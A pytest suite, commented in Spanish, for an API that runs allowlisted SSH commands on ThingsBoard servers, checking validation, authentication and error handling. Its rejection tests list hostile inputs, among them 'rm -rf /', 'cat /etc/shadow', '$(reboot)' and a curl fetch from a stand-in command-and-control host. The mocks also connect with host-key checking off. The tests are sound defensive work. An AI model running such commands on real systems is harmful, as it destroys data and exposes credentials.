import pytest
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch, MagicMock
from fastapi import HTTPException, status
from fastapi.testclient import TestClient
from pydantic import ValidationError

from core.models.user import User
from core.models.tb_server import TBServer, InstallationType, SSHAuthMethod
from core.services.ssh_service import (
    ALLOWED_SSH_COMMANDS,
    validate_ssh_command,
    execute_ssh_command_on_server,
)
from api.endpoints.servers.schemas import SSHExecuteRequest, SSHExecuteResponse
from api.deps import get_current_user, require_superadmin
from api.main import app


def _create_mock_user(role="superadmin", is_superuser=True, is_active=True, user_id="65f01234567890abcdef0001"):
    user = MagicMock(spec=User)
    user.id = user_id
    user.username = f"user_{role}"
    user.email = f"{role}@platform.io"
    user.role = role
    user.is_superuser = is_superuser
    user.is_active = is_active
    user.must_change_password = False
    return user


def _create_mock_server(
    server_id="65f01234567890abcdef9999",
    name="TB-Production-Primary",
    base_url="https://tb-master.internal.corp",
    ssh_port=22,
    ssh_username="tb-admin",
    ssh_auth_method=SSHAuthMethod.PASSWORD,
    password="SecretPassword2026!",
    pem_file=None,
    passphrase=None
):
    server = MagicMock(spec=TBServer)
    server.id = server_id
    server.name = name
    server.base_url = base_url
    server.ssh_host = "tb-master.internal.corp"
    server.ssh_port = ssh_port
    server.ssh_username = ssh_username
    server.ssh_auth_method = ssh_auth_method
    server.get_ssh_password = MagicMock(return_value=password)
    server.get_ssh_pem_file = MagicMock(return_value=pem_file)
    server.get_ssh_passphrase = MagicMock(return_value=passphrase)
    server.user_id = "65f01234567890abcdef0001"
    server.is_active = True
    return server


# =====================================================================
# 1. DTO Schema Validation Tests
# =====================================================================

def test_ssh_execute_request_valid():
    """Valida la creación correcta de SSHExecuteRequest con comando válido y timeout."""
    req = SSHExecuteRequest(command="uptime", timeout_seconds=45)
    assert req.command == "uptime"
    assert req.timeout_seconds == 45

    # Default timeout
    req_default = SSHExecuteRequest(command="df -h")
    assert req_default.timeout_seconds == 30


def test_ssh_execute_request_validation_errors():
    """Valida que comandos vacíos o timeouts fuera de rango sean rechazados."""
    with pytest.raises(ValidationError):
        SSHExecuteRequest(command="")

    with pytest.raises(ValidationError):
        SSHExecuteRequest(command="uptime", timeout_seconds=0)

    with pytest.raises(ValidationError):
        SSHExecuteRequest(command="uptime", timeout_seconds=301)


def test_ssh_execute_response_serialization():
    """Valida la serialización de SSHExecuteResponse."""
    now = datetime.now(timezone.utc)
    res = SSHExecuteResponse(
        server_id="srv-100",
        server_name="Master-1",
        host="192.168.1.10",
        command="uptime",
        exit_status=0,
        stdout="up 45 days",
        stderr="",
        executed_at=now,
        duration_ms=12.5
    )
    assert res.server_id == "srv-100"
    assert res.exit_status == 0
    assert res.stdout == "up 45 days"
    assert res.duration_ms == 12.5


# =====================================================================
# 2. Strict Whitelist & Metacharacter Validation Tests
# =====================================================================

@pytest.mark.parametrize("cmd", list(ALLOWED_SSH_COMMANDS))
def test_validate_ssh_command_allowed_commands(cmd):
    """Verifica que todos los comandos registrados en la lista blanca sean aceptados."""
    result = validate_ssh_command(cmd)
    assert result == cmd


def test_validate_ssh_command_normalizes_spaces():
    """Verifica que espacios redundantes sean normalizados."""
    cmd = "   systemctl    restart    thingsboard   "
    assert validate_ssh_command(cmd) == "systemctl restart thingsboard"


def test_validate_ssh_command_rejects_empty():
    """Comandos vacíos o solo espacios deben lanzar HTTP 400."""
    with pytest.raises(HTTPException) as exc:
        validate_ssh_command("   ")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST


@pytest.mark.parametrize("injection", [
    "systemctl restart thingsboard; whoami",
    "systemctl restart thingsboard && id",
    "systemctl restart thingsboard || cat /etc/shadow",
    "systemctl restart thingsboard | sh",
    "uptime `ls`",
    "uptime $(reboot)",
    "df -h > /tmp/danger.txt",
    "free -m < /dev/urandom",
    "systemctl restart thingsboard\nrm -rf /",
    "systemctl restart thingsboard\r\nrm -rf /",
    "(uptime)",
])
def test_validate_ssh_command_rejects_shell_chaining_and_metasymbols(injection):
    """Verifica que cualquier intento de encadenamiento de shell o metacaracteres sea neutralizado con HTTP 400."""
    with pytest.raises(HTTPException) as exc:
        validate_ssh_command(injection)
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST
    assert "Comando no permitido" in exc.value.detail or "caracteres" in exc.value.detail


@pytest.mark.parametrize("unauthorized_cmd", [
    "rm -rf /",
    "cat /etc/shadow",
    "reboot",
    "shutdown -h now",
    "ls -la /root",
    "curl http://malicious-c2.com/rev.sh",
    "python3 myscript.py",
    "sudo su",
    "hostname",
    "uname -a",
])
def test_validate_ssh_command_rejects_unauthorized_commands(unauthorized_cmd):
    """Comandos arbitrarios no presentes en la lista blanca deben ser rechazados con HTTP 400."""
    with pytest.raises(HTTPException) as exc:
        validate_ssh_command(unauthorized_cmd)
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST
    assert "Sólo se permiten comandos autorizados" in exc.value.detail


# =====================================================================
# 3. SSH Service Execution Tests (execute_ssh_command_on_server)
# =====================================================================

@pytest.mark.asyncio
async def test_execute_ssh_incomplete_configuration():
    """Servidor con configuración SSH incompleta debe lanzar HTTP 400."""
    # Sin host
    server = _create_mock_server()
    server.ssh_host = None
    with pytest.raises(HTTPException) as exc:
        await execute_ssh_command_on_server(server, "uptime")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST

    # Sin username
    server = _create_mock_server()
    server.ssh_username = ""
    with pytest.raises(HTTPException) as exc:
        await execute_ssh_command_on_server(server, "uptime")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST

    # Sin auth_method
    server = _create_mock_server()
    server.ssh_auth_method = None
    with pytest.raises(HTTPException) as exc:
        await execute_ssh_command_on_server(server, "uptime")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST

    # Auth PASSWORD pero sin password
    server = _create_mock_server(password=None)
    with pytest.raises(HTTPException) as exc:
        await execute_ssh_command_on_server(server, "uptime")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST
    assert "contraseña SSH no configurada" in exc.value.detail

    # Auth PEM_KEY pero sin archivo PEM
    server = _create_mock_server(ssh_auth_method=SSHAuthMethod.PEM_KEY, pem_file=None)
    with pytest.raises(HTTPException) as exc:
        await execute_ssh_command_on_server(server, "uptime")
    assert exc.value.status_code == status.HTTP_400_BAD_REQUEST
    assert "llave privada SSH PEM no configurada" in exc.value.detail


@pytest.mark.asyncio
async def test_execute_ssh_success_with_password():
    """Ejecución SSH exitosa con autenticación por contraseña."""
    server = _create_mock_server(
        ssh_auth_method=SSHAuthMethod.PASSWORD,
        password="ValidPassword2026!"
    )

    mock_process = MagicMock()
    mock_process.exit_status = 0
    mock_process.stdout = "ThingsBoard restarted successfully\n"
    mock_process.stderr = ""

    mock_conn = AsyncMock()
    mock_conn.run = AsyncMock(return_value=mock_process)

    mock_cm = AsyncMock()
    mock_cm.__aenter__ = AsyncMock(return_value=mock_conn)
    mock_cm.__aexit__ = AsyncMock(return_value=None)

    with patch("asyncssh.connect", return_value=mock_cm) as mock_connect:
        result = await execute_ssh_command_on_server(
            server=server,
            command="systemctl restart thingsboard",
            timeout_seconds=30
        )

        mock_connect.assert_called_once_with(
            host="tb-master.internal.corp",
            port=22,
            username="tb-admin",
            password="ValidPassword2026!",
            client_keys=None,
            known_hosts=None
        )
        mock_conn.run.assert_called_once_with(
            "systemctl restart thingsboard",
            timeout=30,
            check=False
        )

        assert result["server_id"] == str(server.id)
        assert result["command"] == "systemctl restart thingsboard"
        assert result["exit_status"] == 0
        assert "ThingsBoard restarted successfully" in result["stdout"]
        assert result["stderr"] == ""
        assert result["duration_ms"] >= 0


@pytest.mark.asyncio
async def test_execute_ssh_success_with_pem_key():
    """Ejecución SSH exitosa con autenticación por llave PEM y passphrase opcional."""
    dummy_pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
    server = _create_mock_server(
        ssh_auth_method=SSHAuthMethod.PEM_KEY,
        pem_file=dummy_pem,
        passphrase="key-passphrase-2026"
    )

    mock_key = MagicMock()
    mock_process = MagicMock()
    mock_process.exit_status = 0
    mock_process.stdout = "10:30:00 up 120 days, 2 users, load average: 0.15, 0.20, 0.18\n"
    mock_process.stderr = ""

    mock_conn = AsyncMock()
    mock_conn.run = AsyncMock(return_value=mock_process)

    mock_cm = AsyncMock()
    mock_cm.__aenter__ = AsyncMock(return_value=mock_conn)
    mock_cm.__aexit__ = AsyncMock(return_value=None)

    with patch("asyncssh.import_private_key", return_value=mock_key) as mock_import, \
         patch("asyncssh.connect", return_value=mock_cm) as mock_connect:
        result = await execute_ssh_command_on_server(
            server=server,
            command="uptime",
            timeout_seconds=15
        )

        mock_import.assert_called_once_with(dummy_pem, passphrase="key-passphrase-2026")
        mock_connect.assert_called_once_with(
            host="tb-master.internal.corp",
            port=22,
            username="tb-admin",
            password=None,
            client_keys=[mock_key],
            known_hosts=None
        )
        assert result["exit_status"] == 0
        assert "up 120 days" in result["stdout"]


@pytest.mark.asyncio
async def test_execute_ssh_invalid_pem_key_handled():
    """Llave PEM corrupta o inválida debe lanzar HTTP 400 sin exponer detalles de la llave."""
    import asyncssh
    server = _create_mock_server(
        ssh_auth_method=SSHAuthMethod.PEM_KEY,
        pem_file="corrupted-key-data",
        passphrase="wrong"
    )

    with patch("asyncssh.import_private_key", side_effect=asyncssh.KeyImportError("Bad key")):
        with pytest.raises(HTTPException) as exc:
            await execute_ssh_command_on_server(server, "uptime")
        assert exc.value.status_code == status.HTTP_400_BAD_REQUEST
        assert "inválidas" in exc.value.detail or "incorrectas" in exc.value.detail
        # Cero filtración de credenciales en el mensaje
        assert "corrupted-key-data" not in exc.value.detail
        assert "wrong" not in exc.value.detail


@pytest.mark.asyncio
async def test_execute_ssh_timeout_returns_504():
    """Timeout durante la conexión o ejecución SSH debe retornar HTTP 504."""
    server = _create_mock_server()

    with patch("asyncssh.connect", side_effect=TimeoutError("Connection timed out")):
        with pytest.raises(HTTPException) as exc:
            await execute_ssh_command_on_server(server, "uptime", timeout_seconds=10)
        assert exc.value.status_code == status.HTTP_504_GATEWAY_TIMEOUT
        assert "Tiempo de espera agotado" in exc.value.detail


@pytest.mark.asyncio
async def test_execute_ssh_permission_denied_returns_502():
    """Fallo de autenticación SSH (PermissionDenied) debe retornar HTTP 502."""
    import asyncssh
    server = _create_mock_server()

    with patch("asyncssh.connect", side_effect=asyncssh.PermissionDenied("Auth failed")):
        with pytest.raises(HTTPException) as exc:
            await execute_ssh_command_on_server(server, "uptime")
        assert exc.value.status_code == status.HTTP_502_BAD_GATEWAY
        assert "Error de autenticación SSH" in exc.value.detail


@pytest.mark.asyncio
async def test_execute_ssh_connection_error_returns_502():
    """Fallo de red u OSError en SSH debe retornar HTTP 502 sin filtrar credenciales."""
    server = _create_mock_server(password="SuperSecret123!")

    with patch("asyncssh.connect", side_effect=OSError("Network is unreachable")):
        with pytest.raises(HTTPException) as exc:
            await execute_ssh_command_on_server(server, "uptime")
        assert exc.value.status_code == status.HTTP_502_BAD_GATEWAY
        assert "Error de conexión SSH" in exc.value.detail
        # Garantía DevSecOps: Cero fuga de credenciales
        assert "SuperSecret123!" not in str(exc.value.detail)


# =====================================================================
# 4. Integration Tests for POST /api/v1/servers/{server_id}/ssh/execute
# =====================================================================

@pytest.fixture
def non_superadmin_user():
    return _create_mock_user(role="admin", is_superuser=False, user_id="65f01234567890abcdef0002")


@pytest.fixture
def superadmin_user():
    return _create_mock_user(role="superadmin", is_superuser=True, user_id="65f01234567890abcdef0001")


def test_ssh_execute_endpoint_blocked_for_non_superadmin(non_superadmin_user):
    """
    Verifica que cualquier usuario que no sea Superadministrador estricto sea bloqueado
    con HTTP 403 Forbidden al intentar ejecutar comandos SSH.
    """
    app.dependency_overrides[get_current_user] = lambda: non_superadmin_user

    client = TestClient(app)
    try:
        response = client.post(
            "/api/v1/servers/65f01234567890abcdef9999/ssh/execute",
            json={"command": "uptime", "timeout_seconds": 30}
        )
        assert response.status_code == status.HTTP_403_FORBIDDEN
        assert "superadministrador" in response.json()["detail"].lower()
    finally:
        app.dependency_overrides.clear()


def test_ssh_execute_endpoint_server_not_found(superadmin_user):
    """Superadmin intentando ejecutar comando en servidor inexistente recibe HTTP 404."""
    app.dependency_overrides[get_current_user] = lambda: superadmin_user

    client = TestClient(app)
    try:
        with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=None):
            response = client.post(
                "/api/v1/servers/65f01234567890abcdef9999/ssh/execute",
                json={"command": "uptime", "timeout_seconds": 30}
            )
            assert response.status_code == status.HTTP_404_NOT_FOUND
            assert "no encontrado" in response.json()["detail"].lower()
    finally:
        app.dependency_overrides.clear()


def test_ssh_execute_endpoint_unauthorized_command_blocked(superadmin_user):
    """Superadmin intentando ejecutar comando prohibido (ej: 'reboot') recibe HTTP 400."""
    app.dependency_overrides[get_current_user] = lambda: superadmin_user
    mock_server = _create_mock_server()

    client = TestClient(app)
    try:
        with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server):
            response = client.post(
                f"/api/v1/servers/{mock_server.id}/ssh/execute",
                json={"command": "reboot", "timeout_seconds": 30}
            )
            assert response.status_code == status.HTTP_400_BAD_REQUEST
            assert "Comando no permitido" in response.json()["detail"]
    finally:
        app.dependency_overrides.clear()


def test_ssh_execute_endpoint_command_injection_blocked(superadmin_user):
    """Superadmin intentando inyección con punto y coma recibe HTTP 400."""
    app.dependency_overrides[get_current_user] = lambda: superadmin_user
    mock_server = _create_mock_server()

    client = TestClient(app)
    try:
        with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server):
            response = client.post(
                f"/api/v1/servers/{mock_server.id}/ssh/execute",
                json={"command": "systemctl restart thingsboard; cat /etc/passwd", "timeout_seconds": 30}
            )
            assert response.status_code == status.HTTP_400_BAD_REQUEST
            assert "Comando no permitido" in response.json()["detail"]
    finally:
        app.dependency_overrides.clear()


def test_ssh_execute_endpoint_success(superadmin_user):
    """Superadmin ejecutando comando autorizado en servidor recibe HTTP 200 con SSHExecuteResponse."""
    app.dependency_overrides[get_current_user] = lambda: superadmin_user
    mock_server = _create_mock_server()

    mock_process = MagicMock()
    mock_process.exit_status = 0
    mock_process.stdout = "Active: active (running) since Tue 2026-09-29"
    mock_process.stderr = ""

    mock_conn = AsyncMock()
    mock_conn.run = AsyncMock(return_value=mock_process)

    mock_cm = AsyncMock()
    mock_cm.__aenter__ = AsyncMock(return_value=mock_conn)
    mock_cm.__aexit__ = AsyncMock(return_value=None)

    client = TestClient(app)
    try:
        with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
             patch("asyncssh.connect", return_value=mock_cm):
            response = client.post(
                f"/api/v1/servers/{mock_server.id}/ssh/execute",
                json={"command": "systemctl status thingsboard", "timeout_seconds": 30}
            )
            assert response.status_code == status.HTTP_200_OK
            data = response.json()
            assert data["server_id"] == str(mock_server.id)
            assert data["server_name"] == mock_server.name
            assert data["host"] == mock_server.ssh_host
            assert data["command"] == "systemctl status thingsboard"
            assert data["exit_status"] == 0
            assert "Active: active (running)" in data["stdout"]
            assert data["stderr"] == ""
            assert "executed_at" in data
            assert data["duration_ms"] >= 0
    finally:
        app.dependency_overrides.clear()
